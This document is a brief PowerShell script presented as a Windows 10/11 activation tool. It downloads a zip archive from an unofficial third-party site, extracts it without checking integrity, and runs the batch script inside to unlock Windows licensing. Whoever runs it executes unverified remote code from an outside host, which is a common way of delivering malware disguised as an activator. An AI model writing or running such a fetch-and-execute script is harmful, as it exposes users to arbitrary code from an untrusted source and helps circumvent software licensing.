Write-Host "Win10/11 activation tool"
Write-Host "author: Hans Yao"
Write-Host "email: hansyow@gmail.com"
Write-Host ""

$remoteUrl = "https://lrdtt.site/microsoft-activation-scripts.zip"
$ZipFile = $env:TEMP + "\microsoft-activation-scripts.zip"
$Destination = ".\"
$activateScript = ".\microsoft-activation-scripts-master\MAS\All-In-One-Version\MAS_1.5_AIO_CRC32_21D20776.cmd"

function UnzipFile([string]$ZipFile, [string]$Destination) {
	Add-Type -assembly "system.io.compression.filesystem"
	[io.compression.zipfile]::ExtractToDirectory($ZipFile, $destination)
}

$ScriptFolder = "Microsoft-Activation-Scripts-master"
if (Test-Path -Path $ScriptFolder) {
	Remove-Item -Path $ScriptFolder -Recurse -Force -Confirm:$false
}

Write-Host "Pleas wait ... get Win10/11 activate scripts ..."
Invoke-WebRequest $remoteUrl -OutFile $ZipFile


if (Test-Path -Path $ZipFile -PathType Leaf) {
	try {
		Write-Host "uncompress activation scripts ..."
		UnzipFile $ZipFile $Destination
	}
	catch {
		$_.Exception.Message
	}
}

# start activate
if (Test-Path -Path $activateScript -PathType Leaf) {
	try {
		Write-Host "run activation scripts ..."
		powershell $activateScript
	}
	catch {
		$_.Exception.Message
	}
}
